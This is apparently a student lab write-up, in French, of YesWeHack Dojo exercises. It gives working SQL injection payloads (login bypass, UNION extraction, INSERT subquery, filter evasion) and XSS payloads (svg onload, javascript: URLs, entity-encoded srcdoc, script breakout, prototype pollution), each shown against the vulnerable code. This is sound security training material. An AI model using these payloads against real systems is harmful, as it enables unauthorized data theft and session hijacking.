# Yes We Hack LAB

Groupe : Jullian BACLE, Clément JELEFF
> <https://dojo-yeswehack.com/>

## SOMMAIRE

- [SQL Injection](#SQL-Injection)
  - [Simple login Bypass](#Simple-login-Bypass)
  - [First exfiltration](#First-exfiltration)
  - [No LIMIT](#No-limit)
  - [Exploration](#Exploration)
  - [Injection in INSERT](#Injection-in-insert)
- [XSS](#XSS)

## SQL injection

### `Simple login Bypass`

**Consigne :**\
Essayez de trouver un moyen de vous connecter en tant qu'admin.

> **Goal :  is_valid_password = 1**

**Code présent sur la page :**

```sql
SELECT 
  (`password` = '$pass') is_valid_password
FROM users 
WHERE username = 'admin' 
LIMIT 1;
```

**Injection :**

```js
admin' OR 'a'='a
```

**Résultat :**

```javascript
"is_valid_password": 0
```

**Explication de l'injection :**\
l'injection `OR 'a'='a` permet de contourner la vérification du mot de passe, en précisant seulement qu'il est `true`.

---

### `First exfiltration`

**Consigne :**\
Time to recover some data
Bypassing a password check is nice, but being able to read arbitrary data is better.

> **Goal: recover the admin password**

**Code présent sur la page :**

```sql
SELECT 
  username, email
FROM users 
WHERE email LIKE '%$email%' 
LIMIT 10;
```

**Injection :**

```sql
$email = x'='x' UNION SELECT id, password FROM users'
```

**Résultat :**

```json
[
  {
    "username": 1,
    "email": "FLAG{Th1s_is_th3_4dm1n_p4ssw0rd}"
  },

  [...]
]
```

> FLAG{Th1s_is_th3_4dm1n_p4ssw0rd}

**Explication de l'injection :**\
Utilisation de la commande `UNION` permettant de mettre bout à bout le résultat de plusieurs requête. Ainsi ça nous permet de faire passer un requête de demande d'id et de password sur la table users.

---

### `No LIMIT`

**Consigne :**\
This query should give us the any password, but the limit 0 prevent it.

> **Goal: recover the admin password**

**Code présent sur la page :**

```sql
SELECT password FROM users WHERE username = '$name' LIMIT 0;
```

**Injection :**

```js
admin' --
```

**Résultat :**

```json
[
  {
    "password": "FLAG{Th1s_is_th3_4dm1n_p4ssw0rd}"
  }
]
```

> FLAG{Th1s_is_th3_4dm1n_p4ssw0rd}

**Explication de l'injection :**\
Ici le problème étant `LIMIT 0`, puisqu'il n'affichera aucune ligne. Il se trouve à la fin de la commande SQL, et notre injection est faisable juste avant ce `LIMIT 0`. On a donc seulement à le commenter pour qu'il ne pose plus problème.

---

### `Exploration`

**Consigne :**\
Now that you are able to recover any data, try to explore the database.

> **Goal : recover the flag from the hidden table.**

**Code présent sur la page :**

```sql
SELECT email FROM users WHERE username = '$name' LIMIT 1;
```

**Injection :**

```sql
x'='x' UNION SELECT password FROM users WHERE password LIKE 'FLAG%'--
```

**Résultat :**

```json
[
  {
    "email": "FLAG{Th1s_is_th3_4dm1n_p4ssw0rd}"
  }
]
```

> FLAG{Th1s_is_th3_4dm1n_p4ssw0rd}

**Explication de l'injection :**\
On applique les 2 dernières injections apprises. En les combinants on peut rechercher ce que l'on veut.

---

### `Injection in INSERT`

**Consigne :**\
Sometimes the injection can occur in an INSERT statement.

> **Goal : recover the admin password.**

**Code présent sur la page :**

```sql
INSERT INTO maillinglist(email, enabled) VALUES ('$mail', TRUE);

-- return
SELECT 
  email, enabled
FROM maillinglist 
ORDER BY `id` DESC 
LIMIT 5;
```

**Injection :**

```sql
', (SELECT password FROM users WHERE username LIKE '%admin%'))--
```

**Résultat :**

```json
[
  {
    "email": "",
    "enabled": "FLAG{Th1s_is_th3_4dm1n_p4ssw0rd}"
  },
  {
    "email": "brenda57@hotmail.com",
    "enabled": 1
  },
  [...]
]
```

> FLAG{Th1s_is_th3_4dm1n_p4ssw0rd}

**Explication de l'injection :**\
Ici nous réalisons un requête imbriqué dans une commande `INSERT`, afin de récupèrer le mot de passe admin.

---

### `Filter bypass`

**Consigne :**\
Here your input is heavily transformed before being injected into the query.
While this make the exploitation more difficult, this shouldn’t stop you.

> **Goal : recover the admin password.**

**Code présent sur la page :**

```sql
SELECT 
  `username`, `email`
FROM `users`
WHERE `email` = '@company.name'
LIMIT 5;
```

**Injection :**

```sql
'UNION/**/SELECT/**/username,passpasswordword/**/FROM/**/users/**/WHERE/**/username='admin'--
```

**Résultat :**

```json
[
  {
    "username": "admin",
    "email": "FLAG{Th1s_is_th3_4dm1n_p4ssw0rd}"
  }
]
```

> FLAG{Th1s_is_th3_4dm1n_p4ssw0rd}

**Explication de l'injection :**\
Les 2 principales contraintes de cet exercice était le filtre qui replacé les espaces par des ".", et le filtre qui empêché d'utilisé le mot "password".\
Il est possible de simuler un espace en utilisant la commande de commentaire `/**/`.\
Enfin pour éviter le filtre empêchant d'écrire "password", il suffisait d'écrire `PASSpasswordWORD`, de cette façon le "password" du milieu sera supprimé, laissant `PASSWORD` libre d'utilisation.

---

## XSS

### `Simple XSS`

Le XSS est une vulnérabilité qui permet d'exécuter du code JavaScript sur une machine.
Les attaquants volent généralement les cookies de la victime pour ensuite se faire passer pour elle.

**Consigne :**\
Try to inject some JavaScript in this simple webpage.

> **Goal : `alert(name)`**

**Code présent sur la page :**

```html
<h1>Hello $name</h1>
```

**Solution trouvée :**

```html
<script>alert(name)</script>
```

**Explication de l'injection :**\
La fonction Javascript `alert()` permet de déclencher une alerte sur notre navigateur. En ajoutant une variable entre les parenthèses, l'alerte nous retournera la valeur de cette variable.

---

### `InnerHTML`

**Consigne :**\
`<script></script>`script tags do not work when added via innerHTML, can you find another way to trigger an XSS ?

> **Goal : `alert(name)`**

**Code présent sur la page :**

```html
<h1>Hello <span id="name"></span></h1>
<script>

const name = $name
document.getElementById("name").innerHTML = name

</script>
```

**Solution trouvée :**

```html
<svg onload='alert(name)'>
```

**Explication de l'injection :**\
La fonction `onload()` permet a l'attaquant d'exécuter une attaque string après le chargement de la fenêtre.

---

### `JS urls`

**Consigne :**
Can you spot the XSS here ?

> **Goal: `alert(name)` when the victim click the link**

**Code présent sur la page :**

```html
<a href="$name">Visit my profile</a>
```

**Solution trouvée :**

```js
javascript:alert(name)
```

**Explication de l'injection :**\
Pour cette exercice on utilise le protocole `javascript:` pour déclencher l'exécution du code lorsque la liaison sera ouverte

---

### `Eventless`

**Consigne :**
This time both “script” and JavaScript events are blacklisted.
But there is still another way to trigger JS execution

> **Goal: `alert(name)` when the victim click the link**

**Code présent sur la page :**

```html
<h1>Hello $name</h1>
```

**Solution trouvée :**

```html
<iframe srcdoc='<scr&#105;pt>alert(parent.name)</scr&#105;pt>'>

Ou :

<a href=javas&#99;ript:alert(name)>Click me</a>
```

**Explication de l'injection :**\
Grâce à l'astuce numéro 3 on savait qu'il fallait utiliser l'attribut srcdoc.  
Srcdoc permet de passer le document HTML comme attribut.  
Il suffit ensuite de modifier 1 lettre du mot script en entitié HTML afin de bypass le filtre empêchant d'écrire `script`.

---

### `HTML parser`

**Consigne :**\
Does this protection is enough to protect you against XSS ?

> **Goal: `alert(name)`**

**Code présent sur la page :**

```html
<h1>Hello <span id="name"></span></h1>
<script>
const container = document.getElementById("name")
const name = "$name"
container.innerText = name
</script>
```

**Solution trouvée :**

```html
</script><script>alert(name)</script>
```

**Explication de l'injection :**\
Comme l'analyse HTML passe en première, on peut utiliser la balise de fermeture `</script>` pour terminer le script plus tôt. Et ainsi injecter `alert(name)` dans une autre balise `<script>`.

---

### `Prototype Pollution`

**Consigne :**\
This is a classic prototype polution example, can you exploit it ?

> **Goal: `alert(name)`**

**Code présent sur la page :**

```html
<h1>Hello <span id="name"></span></h1>
<script>
const container = document.getElementById("name")
const isObject = obj => obj && obj.constructor && obj.constructor === Object;
function merge(dest, src) {
    for (var attr in src) {
        if (isObject(dest[attr]) && isObject(src[attr])) {
            merge(dest[attr], src[attr]);
        } else {
            dest[attr] = src[attr];
        }
    }
    return dest
}
const config = {}
const user = {name: "guest"}

merge(user, JSON.parse($user))  // L'injection se fait ici, à la place de $user

if (config.debug){
  container.innerHTML = JSON.stringify(user)
} else {
  container.innerText = JSON.stringify(user)
}
</script>
```

**Solution trouvée :**

```html
{"__proto__": {"debug": 1 }, "x" : "<svg onload='alert(window.name)'>"}
```

**Explication de l'injection :**\
Afin d'ajouter du code malveillant il faut d'abord que `config.debug` soit vrai. Ici `user` et `config` sont tous deux de type `Objet`. Nous pouvons donc grâce à `__proto__` parcourir le prototype de l'objet et y injecter de nouveaux paramètres. Ainsi nous passons `config.debug` en vrai puis nous injectons la fonction `onload()` qui nous affichera l'alerte avec les données demandées.
